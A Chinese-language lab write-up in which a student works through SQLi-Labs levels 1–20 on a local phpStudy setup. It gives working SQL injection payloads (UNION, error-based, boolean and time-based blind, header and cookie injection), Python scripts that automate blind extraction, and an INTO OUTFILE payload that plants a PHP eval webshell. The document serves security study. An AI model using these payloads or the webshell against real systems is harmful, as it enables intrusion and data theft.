# SQLi-Labs 手工注入实战练习

基于 SQLi-Labs 复刻版，手工复盘 SQL 注入从入门到盲注的完整链路（Less-1~10）。

## 环境信息

| 组件 | 版本 |
|---|---|
| 操作系统 | Windows 10 / 11 |
| Web 集成环境 | phpStudy Pro |
| Apache | 2.4.39 |
| MySQL | 5.7.26 |
| PHP | 7.x |
| 字符集 | utf8 / utf8_general_ci |

## 五步法（手工注入通用流程）

1. 判闭合：`?id=1' --+` / `?id=1") --+` 看是否正常返回 → 推断闭合符
2. 数列：`?id=-1' ORDER BY N --+` 探测字段数（报错时的 N-1 即所求）
3. 回显位：`?id=-1' UNION SELECT 1,2,3 --+` 看哪几列被回显
4. 爆库：`UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+`
5. 拖数据：从 information_schema 顺藤摸瓜 → 表 → 列 → 数据

> 注：第 3~5 步要求页面"回显数据"。若页面不回显（Less-5/6/8）或真假页面一样（Less-9/10），要用报错注入或盲注。

## 关卡速览

| 关卡 | 类型 | 闭合符 | 利用手法 | 关键 Payload |
|---|---|---|---|---|
| Less-1 | 字符型 GET | `'` | UNION 回显 | `?id=-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --+` |
| Less-2 | 数字型 GET | 无 | UNION 回显 | `?id=-1 ORDER BY 3 --+` |
| Less-3 | 字符型 GET | `')` | UNION 回显 | `?id=-1') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables --+` |
| Less-4 | 字符型 GET | `")` | UNION 回显 | `?id=-1") UNION SELECT 1,2,3 --+` |
| Less-5 | 字符型 GET（无回显） | `'` | 报错注入 | `?id=1' AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
| Less-6 | 字符型 GET（无回显） | `"` | 报错注入 / 布尔盲注 | `?id=1" AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
| Less-7 | 字符型 GET | `'))` | 文件写入 getshell | `?id=1')) UNION SELECT 1,2,'<?php @eval($_POST[1]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' --+` |
| Less-8 | 字符型 GET（不报错） | `'` | 布尔盲注 | `?id=1' AND substr(database(),1,1)='s' --+` |
| Less-9 | 字符型 GET（真假同页） | `'` | 时间盲注 | `?id=1' AND if(substr(database(),1,1)='s',sleep(3),0) --+` |
| Less-10 | 字符型 GET（真假同页） | `"` | 时间盲注 | `?id=1" AND if(substr(database(),1,1)='s',sleep(3),0) --+` |
| Less-11 | POST 字符型 | `'` | UNION 回显 | uname=`admin' --+` / `' UNION SELECT 1,version(),database() --+` |
| Less-12 | POST 双引号括号 | `")` | UNION 回显 | uname=`) UNION SELECT 1,version(),database() --+` |
| Less-13 | POST 单引号括号（无回显） | `')` | 报错注入 | uname=`) AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
| Less-14 | POST 双引号（无回显） | `"` | 报错注入 | uname=`" AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |
| Less-15 | POST 单引号（不报错） | `'` | 布尔盲注 | uname=`admin' AND substr(database(),1,1)='s' --+` |
| Less-16 | POST 双引号括号（不报错） | `")` | 布尔盲注 | uname=`admin") AND substr(database(),1,1)='s' --+` |
| Less-17 | POST UPDATE（password 字段） | `'` | 报错注入 | passwd=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
| Less-18 | User-Agent 头部 | `'` | 报错注入 | UA=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
| Less-19 | Referer 头部 | `'` | 报错注入 | Referer=`' AND extractvalue(1,concat(0x7e,database(),0x7e)) AND '` |
| Less-20 | Cookie 注入 | `'` | 报错/回显 | Cookie uname=`admin' AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |

## 盲注专题：Less-6~10

### 1. 三种"看不到数据"的场景

| 场景 | 关卡 | 解法 |
|---|---|---|
| 报错能吐数据，但正常查询不回显 | Less-5, Less-6 | 报错注入（extractvalue / updatexml） |
| 完全不报错，只两态（有/无"You are in"） | Less-8 | 布尔盲注 |
| 真假页面一模一样，无法用布尔区分 | Less-9, Less-10 | 时间盲注（sleep 时间差） |

### 2. 布尔盲注（Less-8）

原理：页面只返回"有数据"或"无数据"两种状态。把判断条件塞进 AND，用页面有无"You are in"反推真假。

逐字符猜库名：
```sql
-- 库名首字符是否为 's'（security 首字母）
?id=1' AND substr(database(),1,1)='s' --+
-- 库名长度是否 > 5
?id=1' AND length(database())>5 --+
-- 猜第 1 张表首字符
?id=1' AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u' --+
```

手工太慢，用脚本（Python 逐字符）：
```python
import requests
url = "http://localhost/sqli-labs/Less-8/?id=1'"
charset = "abcdefghijklmnopqrstuvwxyz_"
def blind(sql_inner):
    for c in charset:
        payload = f"' AND substr(({sql_inner}),1,1)='{c}' --+"
        r = requests.get(url + payload)
        if "You are in" in r.text:
            return c
    return '?'
# 例：爆库名（假设已知长度后逐位猜）
db = ''.join(blind("SELECT database()") for _ in range(8))
```

### 3. 时间盲注（Less-9 / Less-10）

原理：页面真假都一样，但可以在 SQL 里 `sleep()`。条件为真就延迟 N 秒，为假立即返回 → 用响应时间差反推。

```sql
-- 真 → 延迟 3 秒
?id=1' AND if(substr(database(),1,1)='s',sleep(3),0) --+
-- 假 → 立即返回
?id=1' AND if(substr(database(),1,1)='x',sleep(3),0) --+
```

Python 自动化：
```python
import requests, time
url = "http://localhost/sqli-labs/Less-9/?id=1'"
def time_blind(sql_inner, c):
    payload = f"' AND if(substr(({sql_inner}),1,1)='{c}',sleep(2),0) --+"
    t0 = time.time()
    requests.get(url + payload)
    return (time.time() - t0) > 2   # 超时即命中
```

> 注意：时间盲注对网络抖动敏感，脚本里加超时阈值 + 重试更稳。真实打点用 sqlmap 的 `--technique=T` 最省事。

### 4. 文件写入 getshell（Less-7）

前置：MySQL `secure_file_priv` 必须允许写目标目录（phpstudy 默认 `NULL` 禁止，需在 my.ini 设 `secure_file_priv=""` 重启）。

```sql
?id=1')) UNION SELECT 1,2,'<?php @eval($_POST[1]);?>' INTO OUTFILE 'C:/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' --+
```

写成功后 `POST 1=phpinfo();` 验证。真实环境需知道绝对路径且有写权限，是实战常见拿 shell 手法。

## POST 注入与头部/Cookie 注入专题：Less-11~20

### 1. POST 型注入（Less-11 ~ Less-17）
GET 注入参数在 URL，POST 注入参数在请求体（表单字段）。判闭合、数列、回显位思路完全一致，只是参数来源从 `$_GET` 变 `$_POST`。

- **Less-11/12**：有回显 → 直接 UNION。uname 处闭合后 `--+` 注释掉密码判断即可登录。
- **Less-13/14**：不回显数据，但保留 `mysqli_error` → 报错注入（extractvalue 把信息带进报错信息）。
- **Less-15/16**：不报错、不回显 → 布尔盲注，靠页面有无 "You are in" 区分真假。
- **Less-17**：UPDATE 语句注入，`password` 字段直接拼进 `UPDATE users SET password='$passwd' WHERE username='$uname'`。注入点在 password，用报错注入带出数据（注意：会真实改掉密码字段值，练习后记得跑 setup-db.php 重置）。

### 2. 头部注入（Less-18 / Less-19）
注入点不在表单，而在 HTTP 请求头：

- **Less-18** 打 `User-Agent` 头：登录成功后后端把 UA 拼进 `INSERT INTO uagents ... VALUES ('$uagent',...)`，UA 里插 `' AND extractvalue(...) AND '` 触发报错。
- **Less-19** 打 `Referer` 头，同理写入 `referers` 表。
- 实操用 Burp Suite 改请求头，或用浏览器插件（ModHeader）改 UA/Referer。

### 3. Cookie 注入（Less-20）
登录成功后 username 写进 Cookie，后续请求从 `$_COOKIE['uname']` 取数拼 SQL：`SELECT * FROM users WHERE username='$cookee'`。改 Cookie 值即注入。Burp 改 Cookie，或浏览器开发者工具 Application 面板改。

> 进阶关卡（Less-21~30）会在此基础上叠加：宽字节绕过（GBK）、二次注入、堆叠查询（`;`）、WAF 绕过。路线见文末。

## 关键陷阱 & 复盘

### 1. MySQL collation 不一致 → UNION 报错
默认 latin1_swedish_ci 的库直接 UNION information_schema 表会抛 `Illegal mix of collations for operation 'UNION'`。
解决：建库显式 `CHARACTER SET utf8 COLLATE utf8_general_ci`；或临时 `CAST(... AS CHAR)`。

### 2. 字符串转数字陷阱（最易误判闭合）
单独 `?id=1' --+` 不能直接确认闭合成功 —— MySQL 把整段隐式转数字成 1，仍匹配 id=1 第一行。
正确判法：看 DEBUG SQL 结构是否完整闭合；用 ORDER BY / UNION 报错做硬证据。

### 3. 盲注的"时间抖动"
时间盲注在网络延迟大时误判率高，脚本务必设合理阈值 + 重试；或优先用布尔盲注（Less-8 比 Less-9 稳）。

## 文件结构

```
sqli-labs/
├── README.md
├── index.php
├── Less-1/ ~ Less-5/   字符型/数字型/报错注入
├── Less-6/ ~ Less-10/  双引号报错 / 文件写入 / 布尔盲注 / 时间盲注
├── Less-11/ ~ Less-17/ POST 型（回显 / 报错 / 盲注 / UPDATE）
├── Less-18/ ~ Less-20/ User-Agent / Referer / Cookie 头部注入
└── sql-connections/     db-creds.inc + setup-db.php（含 uagents/referers 表）
```

## 复现步骤

```bash
1. 启动 phpStudy Pro（Apache + MySQL 均绿）
2. 浏览器访问 http://localhost/sqli-labs/sql-connections/setup-db.php 建库
3. 访问 http://localhost/sqli-labs/ 逐关练习
```

## 后续路线

| 阶段 | 范围 | 技术点 | 状态 |
|---|---|---|---|
| 入门 | Less-1 ~ Less-5 | 字符型/数字型 UNION、报错注入 | 完成 |
| 盲注/文件 | Less-6 ~ Less-10 | 报错对称、文件写入、布尔盲注、时间盲注 | 完成 |
| 进阶 | Less-11 ~ Less-20 | POST 注入、Cookie/Referer/UA 注入 | 完成 |
| 高级 | Less-21 ~ Less-30 | 宽字节、二次注入、堆叠查询 | 计划 |
| 工具化 | sqlmap 自动化 | 复用手工理解的 payload | 计划 |

## 参考
- SQLi-Labs 项目：https://github.com/Audi-1/sqli-labs
- OWASP Top 10 - A03:2021 Injection

> 维护：陈霆（黑龙江大学 网络空间安全 · 2027 届）持续更新中
